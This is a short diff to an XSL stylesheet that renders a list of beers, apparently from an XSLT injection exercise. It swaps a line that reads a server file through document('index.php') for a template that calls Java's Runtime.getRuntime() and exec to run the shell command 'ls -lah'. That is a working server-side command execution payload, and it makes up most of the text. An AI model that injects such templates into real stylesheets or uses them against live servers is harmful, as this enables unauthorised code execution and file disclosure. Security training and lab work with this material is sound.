@@ -3,7 +3,11 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 ===========================================
 
-<xsl:copy-of select="document('index.php')"/>
+               <xsl:template match="/" xmlns:os="java:lang.Runtime" >
+                <xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
+                <xsl:value-of select="os:exec($runtime, 'ls -lah')" />
+               </xsl:template>
+
   
 ===========================================
   <xsl:for-each select="beers/beer">
